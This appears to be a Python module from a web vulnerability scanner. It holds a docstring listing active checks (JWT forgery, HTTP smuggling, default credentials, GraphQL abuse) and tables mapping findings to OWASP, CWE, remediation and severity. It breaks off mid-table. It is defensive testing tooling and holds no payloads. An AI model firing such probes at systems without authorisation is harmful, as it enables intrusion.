"""
VulnerabilityScanner — main DAST engine orchestrator.

Stitches together: PassiveScanner + Fuzzer + specialized active checks.
Emits normalized ScanFinding objects with OWASP category, CWE, remediation,
and chain annotations.

Checks performed:
  1. Passive phase   — headers, cookies, CORS, info disclosure (no payloads)
  2. Active fuzz     — context-aware payload fuzzing via Fuzzer
  3. JWT             — alg=none, weak HMAC, kid injection
  4. CORS active     — origin reflection, null origin, prefix/suffix bypass
  5. Prototype poll  — __proto__ / constructor.prototype injection
  6. Exceptional     — null bytes, huge inputs, type confusion
  7. GraphQL         — introspection, depth bomb, batch abuse
  8. HTTP smuggling  — CL.TE / TE.CL desync probes
  9. Rate limiting   — auth endpoint flood check
  10. Supply chain   — JS library CVE version check
  11. Default creds  — common admin credential pairs
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from types import SimpleNamespace
from typing import Callable, Optional
from itertools import islice

log = logging.getLogger("dast.scanner")
from urllib.parse import parse_qs, urlencode, urlparse, urljoin, urlunparse

import requests
import requests.exceptions
import urllib3

urllib3.disable_warnings()

from .passive import PassiveScanner
from .fuzzer import Fuzzer, FuzzResult, PAYLOADS
from .dedup import FindingDeduplicator
from .event_bus import safe_publish, PHASE_STARTED, PHASE_COMPLETE, FINDING_DEDUPLICATED
from .payload_safety import filter_dangerous_surfaces
from .scope import ScopeManager
from .evidence import EvidenceStore, evidence_store as _global_store
from .graphql import GraphQLScanner
from .websocket import WebSocketScanner
from .dom_xss_active import DomXssActiveScanner
from .race_condition import RaceConditionTester
from .confidence import AuditIssueConfidence, infer_confidence


# ══════════════════════════════════════════════════════════════════════════════
# OWASP / CWE MAPPINGS
# ══════════════════════════════════════════════════════════════════════════════

_OWASP: dict[str, str] = {
    "sqli_error":            "A03:2025 Injection",
    "sqli_blind_time":       "A03:2025 Injection",
    "xss_reflected":         "A03:2025 Injection",
    "lfi":                   "A01:2025 Broken Access Control",
    "cmdi":                  "A03:2025 Injection",
    "ssti":                  "A03:2025 Injection",
    "ssrf":                  "A10:2025 Server-Side Request Forgery",
    "open_redirect":         "A01:2025 Broken Access Control",
    "xxe":                   "A03:2025 Injection",
    "header_injection":      "A03:2025 Injection",
    "crlf_injection":        "A03:2025 Injection",
    "prototype_pollution":   "A03:2025 Injection",
    "exceptional_conditions":"A10:2025 Exceptional Conditions",
    "cors_critical":         "A05:2025 Security Misconfiguration",
    "cors_medium":           "A05:2025 Security Misconfiguration",
    "missing_hsts":          "A02:2025 Cryptographic Failures",
    "missing_csp":           "A05:2025 Security Misconfiguration",
    "missing_httponly":      "A05:2025 Security Misconfiguration",
    "info_disclosure":       "A05:2025 Security Misconfiguration",
    "cors_preflight":        "A05:2025 Security Misconfiguration",
    "cors_cache_poison":     "A05:2025 Security Misconfiguration",
    "jwt_alg_none":          "A07:2025 Identification and Authentication Failures",
    "jwt_weak_secret":       "A07:2025 Identification and Authentication Failures",
    "jwt_kid_injection":     "A07:2025 Identification and Authentication Failures",
    "jwt_alg_confusion":     "A07:2025 Identification and Authentication Failures",
    "jwt_jku_injection":     "A07:2025 Identification and Authentication Failures",
    "jwt_x5u_injection":     "A07:2025 Identification and Authentication Failures",
    "jwt_sig_strip":         "A07:2025 Identification and Authentication Failures",
    "jwt_expired_accept":    "A07:2025 Identification and Authentication Failures",
    "jwt_claim_tamper":      "A07:2025 Identification and Authentication Failures",
    "graphql_introspection":      "A05:2025 Security Misconfiguration",
    "graphql_depth_bomb":         "A05:2025 Security Misconfiguration",
    "graphql_batch_abuse":        "A05:2025 Security Misconfiguration",
    "graphql_alias_dos":          "A05:2025 Security Misconfiguration",
    "graphql_directive_overload": "A05:2025 Security Misconfiguration",
    "graphql_fragment_abuse":     "A05:2025 Security Misconfiguration",
    "graphql_type_enumeration":   "A05:2025 Security Misconfiguration",
    "graphql_field_suggestion":   "A05:2025 Security Misconfiguration",
    "graphql_sqli":               "A03:2025 Injection",
    "graphql_nosqli":             "A03:2025 Injection",
    "graphql_csrf":               "A01:2025 Broken Access Control",
    "graphql_info_disclosure":    "A05:2025 Security Misconfiguration",
    "graphql_get_query":          "A05:2025 Security Misconfiguration",
    "ws_cswsh":                   "A01:2025 Broken Access Control",
    "ws_auth_bypass":             "A07:2025 Identification and Authentication Failures",
    "ws_sqli":                    "A03:2025 Injection",
    "ws_nosqli":                  "A03:2025 Injection",
    "ws_xss":                     "A03:2025 Injection",
    "ws_no_rate_limit":           "A05:2025 Security Misconfiguration",
    "ws_large_frame":             "A05:2025 Security Misconfiguration",
    "ws_info_disclosure":         "A05:2025 Security Misconfiguration",
    "ws_insecure_transport":      "A02:2025 Cryptographic Failures",
    "ws_cmdi":                    "A03:2025 Injection",
    "http_smuggling":             "A05:2025 Security Misconfiguration",
    "missing_rate_limit":    "A07:2025 Identification and Authentication Failures",
    "supply_chain":          "A06:2025 Vulnerable and Outdated Components",
    "default_creds":         "A07:2025 Identification and Authentication Failures",
    "dom_xss":               "A03:2025 Injection",
    "dom_xss_active":        "A03:2025 Injection",
    "race_condition":         "A04:2025 Insecure Design",
    "cookie_scope":          "A05:2025 Security Misconfiguration",
    "cookie_no_samesite":    "A05:2025 Security Misconfiguration",
    "hdr_missing_xfo":       "A05:2025 Security Misconfiguration",
    "hdr_missing_xcto":      "A05:2025 Security Misconfiguration",
    "hdr_missing_referrer":  "A05:2025 Security Misconfiguration",
    "hdr_missing_permissions":"A05:2025 Security Misconfiguration",
    "hdr_missing_coop":      "A05:2025 Security Misconfiguration",
    "hdr_missing_coep":      "A05:2025 Security Misconfiguration",
    "cors_subdomain_wildcard":"A05:2025 Security Misconfiguration",
    "session_fixation":      "A07:2025 Identification and Authentication Failures",
    "session_timeout":       "A07:2025 Identification and Authentication Failures",
    "directory_listing":     "A01:2025 Broken Access Control",
    "source_disclosure":     "A05:2025 Security Misconfiguration",
    "cache_deception":       "A05:2025 Security Misconfiguration",
    "method_override":       "A01:2025 Broken Access Control",
    "user_enumeration":      "A07:2025 Identification and Authentication Failures",
    "error_disclosure":      "A05:2025 Security Misconfiguration",
    "mixed_content":         "A02:2025 Cryptographic Failures",
    "insecure_form_action":  "A02:2025 Cryptographic Failures",
    "password_autocomplete": "A07:2025 Identification and Authentication Failures",
    "subdomain_takeover":    "A05:2025 Security Misconfiguration",
    "open_api_exposure":     "A05:2025 Security Misconfiguration",
    "trace_xst":             "A05:2025 Security Misconfiguration",
    "csrf_token_weak":       "A01:2025 Broken Access Control",
    "file_upload_bypass":    "A04:2025 Insecure Design",
    "clickjacking":          "A05:2025 Security Misconfiguration",
    "ssi_injection":         "A03:2025 Injection",
    "rfi":                   "A03:2025 Injection",
    "format_string":         "A03:2025 Injection",
    "xml_injection":         "A03:2025 Injection",
    "weak_tls":              "A02:2025 Cryptographic Failures",
    "weak_cipher":           "A02:2025 Cryptographic Failures",
    "brute_force_no_protection": "A07:2025 Identification and Authentication Failures",
    "logging_monitoring_absent": "A09:2025 Security Logging and Monitoring Failures",
    "sri_missing":           "A08:2025 Software and Data Integrity Failures",
    "supply_chain_runtime":  "A06:2025 Vulnerable and Outdated Components",
    "host_header_injection": "A05:2025 Security Misconfiguration",
    "hpp":                   "A03:2025 Injection",
    "nosql_injection":       "A03:2025 Injection",
    "deserialization":       "A08:2025 Software and Data Integrity Failures",
    "ldap_injection":        "A03:2025 Injection",
    "log_injection":         "A03:2025 Injection",
    "oauth_misconfig":       "A07:2025 Identification and Authentication Failures",
    "web_cache_poisoning":   "A05:2025 Security Misconfiguration",
    "cache_poisoning":       "A05:2025 Security Misconfiguration",
    "mass_assignment":       "A04:2025 Insecure Design",
    "business_logic":        "A04:2025 Insecure Design",
    "cert_transparency":     "A05:2025 Security Misconfiguration",
    "esi_injection":         "A03:2025 Injection",
    "shellshock":            "A03:2025 Injection",
    "jetty_leak":            "A05:2025 Security Misconfiguration",
    "struts_rce":            "A03:2025 Injection",
    "struts_namespace_rce":  "A03:2025 Injection",
    "rails_file_disclosure": "A01:2025 Broken Access Control",
    "xpath_injection":       "A03:2025 Injection",
    # ── Burp extensions digest (snoopysecurity/awesome-burp-extensions) ────────
    "reverse_tabnabbing":    "A05:2025 Security Misconfiguration",
    "jsonp_endpoint":        "A05:2025 Security Misconfiguration",
    "access_403_bypass":     "A01:2025 Broken Access Control",
    "log4shell":             "A03:2025 Injection",
    "httpoxy":               "A10:2025 Server-Side Request Forgery",
    "cryptomining_script":   "A08:2025 Software and Data Integrity Failures",
}

_CWE: dict[str, str] = {
    "sqli_error":            "CWE-89",
    "sqli_blind_time":       "CWE-89",
    "xss_reflected":         "CWE-79",
    "lfi":                   "CWE-22",
    "cmdi":                  "CWE-78",
    "ssti":                  "CWE-94",
    "ssrf":                  "CWE-918",
    "open_redirect":         "CWE-601",
    "xxe":                   "CWE-611",
    "header_injection":      "CWE-113",
    "crlf_injection":        "CWE-93",
    "prototype_pollution":   "CWE-1321",
    "exceptional_conditions":"CWE-754",
    "cors_critical":         "CWE-942",
    "cors_medium":           "CWE-942",
    "missing_hsts":          "CWE-319",
    "missing_csp":           "CWE-693",
    "missing_httponly":      "CWE-1004",
    "info_disclosure":       "CWE-200",
    "cors_preflight":        "CWE-942",
    "cors_cache_poison":     "CWE-525",
    "jwt_alg_none":          "CWE-347",
    "jwt_weak_secret":       "CWE-330",
    "jwt_kid_injection":     "CWE-20",
    "jwt_alg_confusion":     "CWE-347",
    "jwt_jku_injection":     "CWE-20",
    "jwt_x5u_injection":     "CWE-20",
    "jwt_sig_strip":         "CWE-347",
    "jwt_expired_accept":    "CWE-613",
    "jwt_claim_tamper":      "CWE-285",
    "graphql_introspection":      "CWE-200",
    "graphql_depth_bomb":         "CWE-400",
    "graphql_batch_abuse":        "CWE-400",
    "graphql_alias_dos":          "CWE-400",
    "graphql_directive_overload": "CWE-400",
    "graphql_fragment_abuse":     "CWE-400",
    "graphql_type_enumeration":   "CWE-200",
    "graphql_field_suggestion":   "CWE-200",
    "graphql_sqli":               "CWE-89",
    "graphql_nosqli":             "CWE-943",
    "graphql_csrf":               "CWE-352",
    "graphql_info_disclosure":    "CWE-200",
    "graphql_get_query":          "CWE-16",
    "ws_cswsh":                   "CWE-346",
    "ws_auth_bypass":             "CWE-287",
    "ws_sqli":                    "CWE-89",
    "ws_nosqli":                  "CWE-943",
    "ws_xss":                     "CWE-79",
    "ws_no_rate_limit":           "CWE-770",
    "ws_large_frame":             "CWE-400",
    "ws_info_disclosure":         "CWE-200",
    "ws_insecure_transport":      "CWE-319",
    "ws_cmdi":                    "CWE-78",
    "http_smuggling":             "CWE-444",
    "missing_rate_limit":    "CWE-307",
    "supply_chain":          "CWE-1395",
    "default_creds":         "CWE-798",
    "dom_xss":               "CWE-79",
    "dom_xss_active":        "CWE-79",
    "race_condition":         "CWE-362",
    "cookie_scope":          "CWE-1275",
    "cookie_no_samesite":    "CWE-1275",
    "hdr_missing_xfo":       "CWE-1021",
    "hdr_missing_xcto":      "CWE-16",
    "hdr_missing_referrer":  "CWE-200",
    "hdr_missing_permissions":"CWE-16",
    "hdr_missing_coop":      "CWE-16",
    "hdr_missing_coep":      "CWE-16",
    "cors_subdomain_wildcard":"CWE-942",
    "session_fixation":      "CWE-384",
    "session_timeout":       "CWE-613",
    "directory_listing":     "CWE-548",
    "source_disclosure":     "CWE-540",
    "cache_deception":       "CWE-525",
    "method_override":       "CWE-650",
    "user_enumeration":      "CWE-204",
    "error_disclosure":      "CWE-209",
    "mixed_content":         "CWE-311",
    "insecure_form_action":  "CWE-319",
    "password_autocomplete": "CWE-522",
    "subdomain_takeover":    "CWE-284",
    "open_api_exposure":     "CWE-200",
    "trace_xst":             "CWE-693",
    "csrf_token_weak":       "CWE-352",
    "file_upload_bypass":    "CWE-434",
    "clickjacking":          "CWE-1021",
    "ssi_injection":         "CWE-97",
    "rfi":                   "CWE-98",
    "format_string":         "CWE-134",
    "xml_injection":         "CWE-91",
    "weak_tls":              "CWE-326",
    "weak_cipher":           "CWE-327",
    "brute_force_no_protection": "CWE-307",
    "logging_monitoring_absent": "CWE-778",
    "sri_missing":           "CWE-353",
    "supply_chain_runtime":  "CWE-1395",
    "host_header_injection": "CWE-644",
    "hpp":                   "CWE-235",
    "nosql_injection":       "CWE-943",
    "deserialization":       "CWE-502",
    "ldap_injection":        "CWE-90",
    "log_injection":         "CWE-117",
    "oauth_misconfig":       "CWE-601",
    "web_cache_poisoning":   "CWE-525",
    "cache_poisoning":       "CWE-525",
    "mass_assignment":       "CWE-915",
    "business_logic":        "CWE-840",
    "cert_transparency":     "CWE-295",
    "esi_injection":         "CWE-97",
    "shellshock":            "CWE-78",
    "jetty_leak":            "CWE-200",
    "struts_rce":            "CWE-94",
    "struts_namespace_rce":  "CWE-94",
    "rails_file_disclosure": "CWE-22",
    "xpath_injection":       "CWE-643",
    # ── Burp extensions digest ─────────────────────────────────────────────────
    "reverse_tabnabbing":    "CWE-1022",
    "jsonp_endpoint":        "CWE-942",
    "access_403_bypass":     "CWE-284",
    "log4shell":             "CWE-917",
    "httpoxy":               "CWE-918",
    "cryptomining_script":   "CWE-1395",
}

_REMEDIATION: dict[str, str] = {
    "sqli_error":            "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
    "sqli_blind_time":       "Use parameterized queries. Apply input validation. Use WAF as defense-in-depth.",
    "xss_reflected":         "HTML-encode all user-controlled output. Implement Content-Security-Policy.",
    "lfi":                   "Validate file paths against an allowlist. Never pass user input directly to file functions.",
    "cmdi":                  "Never pass user input to shell commands. Use subprocess with list args, no shell=True.",
    "ssti":                  "Sandbox template rendering. Use safe template engines. Validate/sanitize template inputs.",
    "ssrf":                  "Validate and allowlist URLs. Block requests to 169.254.0.0/16 and RFC-1918 ranges.",
    "open_redirect":         "Validate redirect targets against an allowlist. Use relative paths for redirects.",
    "xxe":                   "Disable external entity processing in XML parsers. Use safe parser configurations.",
    "header_injection":      "Validate and sanitize header values. Reject input containing CR/LF characters.",
    "crlf_injection":        "Reject or encode CR (\\r) and LF (\\n) characters in header values.",
    "prototype_pollution":   "Use Object.create(null) for data objects. Validate JSON keys against allowlist.",
    "exceptional_conditions":"Implement robust input validation. Handle edge cases explicitly. Never expose error details.",
    "cors_critical":         "Set Access-Control-Allow-Origin to specific trusted origins. Never reflect arbitrary origins with credentials=true.",
    "cors_medium":           "Restrict CORS to specific trusted origins. Remove wildcard (*) for authenticated APIs.",
    "missing_hsts":          "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    "missing_csp":           "Implement Content-Security-Policy: default-src 'self'. Avoid 'unsafe-inline'.",
    "missing_httponly":      "Add HttpOnly flag to all session and authentication cookies.",
    "info_disclosure":       "Remove version headers. Disable debug mode. Suppress stack traces in production.",
    "cors_preflight":        "Restrict pre-flight responses. Don't allow arbitrary request headers or methods via CORS.",
    "cors_cache_poison":     "Include 'Vary: Origin' header when CORS responses depend on Origin. Prevents cache poisoning.",
    "jwt_alg_none":          "Validate JWT algorithm header. Reject 'none' algorithm. Pin expected algorithm server-side.",
    "jwt_weak_secret":       "Use cryptographically random secret of 256+ bits. Rotate secrets regularly.",
    "jwt_kid_injection":     "Validate the 'kid' header against an allowlist. Never pass kid to shell or SQL.",
    "jwt_alg_confusion":     "Pin the expected algorithm server-side. Never allow the token to dictate algorithm. Use asymmetric verification.",
    "jwt_jku_injection":     "Ignore jku/x5u/jwk headers in untrusted tokens. Pin key source to server config.",
    "jwt_x5u_injection":     "Ignore x5u headers in untrusted tokens. Never fetch X.509 certs from attacker-controlled URLs.",
    "jwt_sig_strip":         "Always verify JWT signature. Reject tokens with empty or missing signature.",
    "jwt_expired_accept":    "Validate exp claim server-side. Reject expired tokens with appropriate clock skew.",
    "jwt_claim_tamper":      "Validate all security-relevant claims server-side. Don't trust client-supplied role/admin claims.",
    "graphql_introspection":      "Disable GraphQL introspection in production. Use query depth/complexity limits.",
    "graphql_depth_bomb":         "Implement query depth limiting (max depth 7). Use query complexity analysis.",
    "graphql_batch_abuse":        "Disable batch queries or limit to max 5 per request. Add rate limiting per query.",
    "graphql_alias_dos":          "Limit the number of aliases per query (max 10-20). Use query complexity analysis.",
    "graphql_directive_overload": "Limit directive count per query. Validate directive usage at the gateway.",
    "graphql_fragment_abuse":     "Reject circular fragments. Limit fragment depth to 5 levels.",
    "graphql_type_enumeration":   "Disable __type queries in production alongside introspection.",
    "graphql_field_suggestion":   "Disable field suggestion in production to prevent schema enumeration.",
    "graphql_sqli":               "Use parameterized resolvers. Never concatenate user input into SQL within GraphQL resolvers.",
    "graphql_nosqli":             "Validate and sanitize all GraphQL arguments. Use ODM/ORM with parameterized queries.",
    "graphql_csrf":               "Reject mutations via GET. Require POST for all state-changing operations. Add CSRF tokens.",
    "graphql_info_disclosure":    "Mask error details in production. Return generic error messages without stack traces.",
    "graphql_get_query":          "Disable GET-based query execution or restrict to persisted queries only.",
    "ws_cswsh":                   "Validate WebSocket Origin header against allowlist. Reject connections from untrusted origins.",
    "ws_auth_bypass":             "Require authentication token in WebSocket handshake. Validate session on every connection.",
    "ws_sqli":                    "Use parameterized queries in WebSocket message handlers. Never concatenate frame data into SQL.",
    "ws_nosqli":                  "Validate and sanitize all WebSocket message fields. Use ODM/ORM with parameterized queries.",
    "ws_xss":                     "HTML-encode all WebSocket message data before rendering. Implement Content-Security-Policy.",
    "ws_no_rate_limit":           "Implement per-connection message rate limiting. Disconnect clients exceeding thresholds.",
    "ws_large_frame":             "Set maximum WebSocket frame size (e.g., 64KB). Reject oversized payloads at the gateway.",
    "ws_info_disclosure":         "Return generic error messages for malformed frames. Suppress stack traces in production.",
    "ws_insecure_transport":      "Use wss:// (WebSocket Secure) for all connections. Disable ws:// in production.",
    "ws_cmdi":                    "Never pass WebSocket message data to shell commands. Use subprocess with list args.",
    "http_smuggling":             "Normalize Transfer-Encoding and Content-Length handling. Use HTTP/2 end-to-end.",
    "missing_rate_limit":    "Implement rate limiting on auth endpoints. Add lockout after 5–10 failed attempts.",
    "supply_chain":          "Update vulnerable libraries to patched versions. Use dependency scanning in CI/CD.",
    "default_creds":         "Change all default credentials immediately after deployment. Enforce strong password policy.",
    "dom_xss":               "Sanitize all DOM sink inputs. Use textContent instead of innerHTML. Avoid eval/document.write.",
    "dom_xss_active":        "Sanitize all user-controlled DOM inputs. Use safe APIs (textContent, setAttribute). Implement CSP to block inline scripts.",
    "race_condition":         "Use database transactions with serializable isolation. Implement distributed locks. Add idempotency keys to state-changing operations.",
    "cookie_scope":          "Set Path=/ and Domain to the exact domain. Add Secure, HttpOnly, SameSite=Strict flags.",
    "cookie_no_samesite":    "Add SameSite=Lax or SameSite=Strict to all cookies. Prevents CSRF via cross-site requests.",
    "hdr_missing_xfo":       "Add X-Frame-Options: DENY or SAMEORIGIN, or use CSP frame-ancestors directive.",
    "hdr_missing_xcto":      "Add X-Content-Type-Options: nosniff to prevent MIME-type sniffing attacks.",
    "hdr_missing_referrer":  "Add Referrer-Policy: strict-origin-when-cross-origin to limit referrer leakage.",
    "hdr_missing_permissions":"Add Permissions-Policy to restrict browser feature access (camera, microphone, geolocation).",
    "hdr_missing_coop":      "Add Cross-Origin-Opener-Policy: same-origin to isolate browsing context.",
    "hdr_missing_coep":      "Add Cross-Origin-Embedder-Policy: require-corp to prevent cross-origin resource loading.",
    "cors_subdomain_wildcard":"Avoid *.domain.com patterns in CORS. Subdomain takeover enables full CORS bypass with credentials.",
    "session_fixation":      "Regenerate session ID after authentication. Invalidate pre-auth session tokens.",
    "session_timeout":       "Set session timeout to 15-30 minutes for sensitive apps. Enforce server-side expiry.",
    "directory_listing":     "Disable directory indexing in web server config. Add index files to all directories.",
    "source_disclosure":     "Block access to source files via web server config. Remove backup/temp files from production.",
    "cache_deception":       "Configure cache to key on full URL path. Don't cache responses based on file extension alone.",
    "method_override":       "Ignore X-HTTP-Method-Override header or restrict to trusted internal clients only.",
    "user_enumeration":      "Return identical responses for valid/invalid usernames. Use generic error messages.",
    "error_disclosure":      "Disable detailed error pages in production. Return generic 500 error page. Log details server-side.",
    "mixed_content":         "Serve all resources over HTTPS. Use protocol-relative URLs or enforce HSTS with includeSubDomains.",
    "insecure_form_action":  "Always submit forms over HTTPS. Set form action to HTTPS URLs explicitly.",
    "password_autocomplete": "Add autocomplete='off' or autocomplete='new-password' to sensitive input fields.",
    "subdomain_takeover":    "Remove dangling DNS records. Monitor CNAME targets for expired/unclaimed services.",
    "open_api_exposure":     "Restrict API documentation to authenticated users. Remove swagger/openapi endpoints in production.",
    "trace_xst":             "Disable TRACE method on the web server. Use TraceEnable Off in Apache.",
    "csrf_token_weak":       "Generate CSRF tokens with 128+ bits of entropy using CSPRNG. Bind tokens to session.",
    "file_upload_bypass":    "Validate file content (magic bytes), not just extension/content-type. Use allowlists.",
    "clickjacking":          "Set X-Frame-Options: DENY and CSP frame-ancestors 'none' to prevent framing.",
    "ssi_injection":         "Disable SSI processing or sanitize user input from SSI directives. Use mod_include carefully.",
    "rfi":                   "Disable remote file inclusion (allow_url_include=Off). Validate file paths against allowlist.",
    "format_string":         "Never pass user input as format string argument. Use parameterized logging.",
    "xml_injection":         "Validate and sanitize XML input. Use XML schema validation. Escape special XML characters.",
    "weak_tls":              "Disable SSLv3, TLS 1.0, TLS 1.1. Enforce TLS 1.2+ with strong cipher suites.",
    "weak_cipher":           "Disable RC4, DES, 3DES, NULL, EXPORT ciphers. Use AES-GCM or ChaCha20-Poly1305.",
    "brute_force_no_protection": "Implement account lockout after 5-10 failed attempts. Add CAPTCHA. Use rate limiting.",
    "logging_monitoring_absent": "Log all authentication events, access control failures, and input validation failures. Set up alerting.",
    "sri_missing":           "Add integrity attribute with SHA-384 hash to all external script and stylesheet tags.",
    "supply_chain_runtime":  "Update vulnerable libraries to patched versions. Pin dependency versions. Use SRI for CDN resources.",
    "host_header_injection": "Validate Host header server-side. Use a whitelist of allowed hostnames. Avoid using Host header in URL generation.",
    "hpp":                   "Define clear parameter precedence. Reject duplicate parameters. Use strict input parsing.",
    "nosql_injection":       "Sanitize all user input before NoSQL queries. Use parameterized queries. Reject operator keys like $ne, $gt.",
    "deserialization":       "Never deserialize untrusted data. Use safe formats like JSON. Validate and sign serialized objects.",
    "ldap_injection":        "Escape special LDAP characters in user input. Use parameterized LDAP queries. Validate input against allowlist.",
    "log_injection":         "Strip or encode CR/LF characters from log input. Use structured logging. Validate log message content.",
    "oauth_misconfig":       "Validate redirect_uri against exact allowlist. Require state parameter. Use PKCE for public clients.",
    "web_cache_poisoning":   "Key cache on all relevant headers. Set Vary header correctly. Don't reflect unkeyed headers in responses.",
    "cache_poisoning":       "Include all security-relevant headers in the cache key. Use Vary header to signal header-keyed caches. Strip or reject unrecognized forwarding headers at the CDN/proxy edge.",
    "mass_assignment":       "Use explicit allowlists for bindable parameters. Never auto-bind request data to internal models without filtering.",
    "business_logic":        "Validate business rules server-side. Check for negative values, overflows, and boundary conditions.",
    "cert_transparency":     "Monitor Certificate Transparency logs for unauthorized certificates. Use CAA DNS records to restrict issuers.",
    "esi_injection":         "Disable ESI processing or sanitize user input before ESI evaluation. Use allowlists for ESI include sources.",
    "shellshock":            "Update Bash to a patched version (4.3 patch 25+). Avoid passing untrusted input through CGI environment variables.",
    "jetty_leak":            "Upgrade Jetty to 9.2.9+ or 9.3.x. The Illegal character bug (CVE-2015-2080) leaks server memory in 400 responses.",
    "struts_rce":            "Upgrade Apache Struts to 2.3.32+ or 2.5.10.1+. Apply Content-Type validation. CVE-2017-5638 allows RCE via OGNL in Content-Type.",
    "struts_namespace_rce":  "Upgrade Apache Struts to 2.3.35+ or 2.5.17+. CVE-2018-11776 allows RCE via crafted namespace/action URLs.",
    "rails_file_disclosure": "Upgrade Rails to 5.2.2.1+, 5.1.6.2+, 5.0.7.2+, or 4.2.11.1+. CVE-2019-5418 allows arbitrary file reads via Accept header.",
    "xpath_injection":       "Use parameterized XPath queries. Never concatenate user input into XPath expressions.",
    # ── Burp extensions digest ─────────────────────────────────────────────────
    "reverse_tabnabbing":    "Add rel='noopener noreferrer' to all <a target='_blank'> links to prevent reverse tabnabbing.",
    "jsonp_endpoint":        "Restrict JSONP endpoints to same-origin. Prefer CORS with Access-Control-Allow-Origin over JSONP. Validate callback parameter against strict allowlist of alphanumeric names.",
    "access_403_bypass":     "Implement access control in application business logic, not solely at the routing layer. Normalize paths server-side before authorization checks. Never rely on proxy-level 403 as the only access control gate.",
    "log4shell":             "Upgrade Log4j2 to 2.17.1+ (Java 8) or 2.12.4+ (Java 7). Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class",
    "httpoxy":               "Unset HTTP_PROXY environment variable in CGI/FastCGI contexts. Block 'Proxy' header at the web server (Apache: RequestHeader unset Proxy; Nginx: proxy_set_header Proxy ''). CVE-2016-5385.",
    "cryptomining_script":   "Remove unauthorized cryptomining scripts immediately. Implement CSP script-src allowlist. Set up file integrity monitoring and SRI for all external scripts. Report the breach to relevant parties.",
}

_SEV: dict[str, str] = {
    "sqli_error":            "high",
    "sqli_blind_time":       "high",
    "xss_reflected":         "high",
    "lfi":                   "critical",
    "cmdi":                  "critical",
    "ssti":                  "high",
    "ssrf":                  "critical",
    "open_redirect":         "medium",
    "xxe":                   "critical",
    "header_injection":      "medium",
    "crlf_injection":        "medium",
    "prototype_pollution":   "high",
    "exceptional_conditions":"medium",
    "cors_critical":         "critical",
    "cors_medium":           "medium",
    "missing_hsts":          "high",
    "missing_csp":           "medium",
    "missing_httponly":      "medium",
    "info_disclosure":       "low",
    "cors_preflight":        "medium",
    "cors_cache_poison":     "medium",
    "jwt_alg_none":          "critical",
    "jwt_weak_secret":       "critical",
    "jwt_kid_injection":     "high",
    "jwt_alg_confusion":     "critical",
    "jwt_jku_injection":     "high",
    "jwt_x5u_injection":     "high",
    "jwt_sig_strip":         "critical",
    "jwt_expired_accept":    "medium",
    "jwt_claim_tamper":      "high",
    "graphql_introspection":      "medium",
    "graphql_depth_bomb":         "medium",
    "graphql_batch_abuse":        "medium",
    "graphql_alias_dos":          "medium",
    "graphql_directive_overload": "medium",
    "graphql_fragment_abuse":     "high",
    "graphql_type_enumeration":   "medium",
    "graphql_field_suggestion":   "low",
    "graphql_sqli":               "high",
    "graphql_nosqli":             "high",
    "graphql_csrf":               "high",
    "graphql_info_disclosure":    "medium",
    "graphql_get_query":          "low",
    "ws_cswsh":                   "high",
    "ws_auth_bypass":             "high",
    "ws_sqli":                    "high",
    "ws_nosqli":                  "high",
    "ws_xss":                     "high",
    "ws_no_rate_limit":           "medium",
    "ws_large_frame":             "medium",
    "ws_info_disclosure":         "medium",
    "ws_insecure_transport":      "high",
    "ws_cmdi":                    "critical",
    "http_smuggling":             "high",
    "missing_rate_limit":    "high",
    "supply_chain":          "medium",
    "default_creds":         "critical",
    "dom_xss":               "high",
    "dom_xss_active":        "critical",
    "race_condition":         "high",
    "cookie_scope":          "medium",
    "cookie_no_samesite":    "medium",
    "hdr_missing_xfo":       "medium",
    "hdr_missing_xcto":      "low",
    "hdr_missing_referrer":  "low",
    "hdr_missing_permissions":"low",
    "hdr_missing_coop":      "low",
    "hdr_missing_coep":      "low",
    "cors_subdomain_wildcard":"high",
    "session_fixation":      "high",
    "session_timeout":       "medium",
    "directory_listing":     "medium",
    "source_disclosure":     "high",
    "cache_deception":       "high",
    "method_override":       "medium",
    "user_enumeration":      "medium",
    "error_disclosure":      "medium",
    "mixed_content":         "medium",
    "insecure_form_action":  "medium",
    "password_autocomplete": "low",
    "subdomain_takeover":    "high",
    "open_api_exposure":     "medium",
    "trace_xst":             "medium",
    "csrf_token_weak":       "high",
    "file_upload_bypass":    "high",
    "clickjacking":          "medium",
    "ssi_injection":         "high",
    "rfi":                   "critical",
    "format_string":         "high",
    "xml_injection":         "high",
    "weak_tls":              "high",
    "weak_cipher":           "high",
    "brute_force_no_protection": "high",
    "logging_monitoring_absent": "info",
    "sri_missing":           "medium",
    "supply_chain_runtime":  "high",
    "host_header_injection": "high",
    "hpp":                   "medium",
    "nosql_injection":       "critical",
    "deserialization":       "critical",
    "ldap_injection":        "high",
    "log_injection":         "medium",
    "oauth_misconfig":       "high",
    "web_cache_poisoning":   "high",
    "cache_poisoning":       "high",
    "mass_assignment":       "high",
    "business_logic":        "high",
    "cert_transparency":     "low",
    "esi_injection":         "high",
    "shellshock":            "critical",
    "jetty_leak":            "medium",
    "struts_rce":            "critical",
    "struts_namespace_rce":  "critical",
    "rails_file_disclosure": "high",
    "xpath_injection":       "high",
    # ── Burp extensions digest ─────────────────────────────────────────────────
    "reverse_tabnabbing":    "medium",
    "jsonp_endpoint":        "medium",
    "access_403_bypass":     "high",
    "log4shell":             "critical",
    "httpoxy":               "high",
    "cryptomining_script":   "high",
}

# Context-aware param name → payload types mapping
_PARAM_CONTEXT: dict[str, list[str]] = {
    "email":     ["header_injection"],
    "mail":      ["header_injection"],
    "redirect":  ["open_redirect", "ssrf"],
    "next":      ["open_redirect", "ssrf"],
    "url":       ["open_redirect", "ssrf"],
    "return_to": ["open_redirect", "ssrf"],
    "callback":  ["open_redirect", "ssrf"],
    "file":      ["lfi"],
    "path":      ["lfi"],
    "filename":  ["lfi"],
    "page":      ["lfi"],
    "include":   ["lfi"],
    "load":      ["lfi"],
    "template":  ["ssti"],
    "tpl":       ["ssti"],
    "render":    ["ssti"],
    "cmd":       ["cmdi"],
    "exec":      ["cmdi"],
    "command":   ["cmdi"],
    "run":       ["cmdi"],
    "q":         ["sqli_error", "sqli_blind_time", "xss_reflected"],
    "search":    ["sqli_error", "sqli_blind_time", "xss_reflected"],
    "query":     ["sqli_error", "sqli_blind_time", "xss_reflected"],
